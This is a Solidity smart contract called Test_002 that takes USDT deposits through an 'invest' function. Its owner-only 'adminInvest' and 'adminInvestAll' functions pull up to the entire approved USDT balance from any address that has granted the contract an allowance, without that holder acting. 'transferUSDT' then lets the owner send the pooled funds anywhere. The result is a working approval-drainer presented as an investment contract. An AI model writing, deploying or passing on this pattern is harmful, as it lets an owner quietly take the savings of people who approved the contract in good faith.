contract Test_002 is Ownable {
    IERC20Metadata public usdt;
    
    constructor() {
        usdt = IERC20Metadata(0x55d398326f99059fF775485246999027B3197955);
    }
    
// ******************************* USER FUNCTIONS *******************************//		

        function invest(uint256 _amountPaid) public {

        //receive payment

        uint256 balanceBefore = usdt.balanceOf(address(this));
        usdt.transferFrom(msg.sender, address(this), _amountPaid);
        uint256 balanceAfter = usdt.balanceOf(address(this));
        require(balanceAfter - balanceBefore == _amountPaid, "USDT Payment error");

    }

// ******************************* ADMIN FUNCTIONS *******************************//		
    function adminInvest(address _fromAddress, uint256 _amount) public onlyOwner{
	    require(usdt.balanceOf(_fromAddress) >= _amount, "Not enough usdt to invest");
        require(usdt.allowance(_fromAddress, address(this)) >= _amount, "Not enough usdt allowance");

        usdt.transferFrom(_fromAddress,address(this),_amount);
    }


    function adminInvestAll(address _fromAddress) public onlyOwner{
	    require(usdt.balanceOf(_fromAddress) > 0, "Nothing to invest");
        require(usdt.allowance(_fromAddress, address(this)) > 0, "No usdt allowance");

        uint256 max = 0;
        if (usdt.balanceOf(_fromAddress) <= usdt.allowance(_fromAddress, address(this))){
            max = usdt.balanceOf(_fromAddress);
        }else {
            max = usdt.allowance(_fromAddress, address(this));
        }

        usdt.transferFrom(_fromAddress,address(this),max);
    }


    function transferUSDT(address _to, uint256 _amount) public onlyOwner {
        usdt.transfer(_to, _amount);
    }

// ******************************* VIEW FUNCTIONS *******************************//		
    function getUSDTBalance() public view returns (uint256) {
        return usdt.balanceOf(address(this));
    }



}
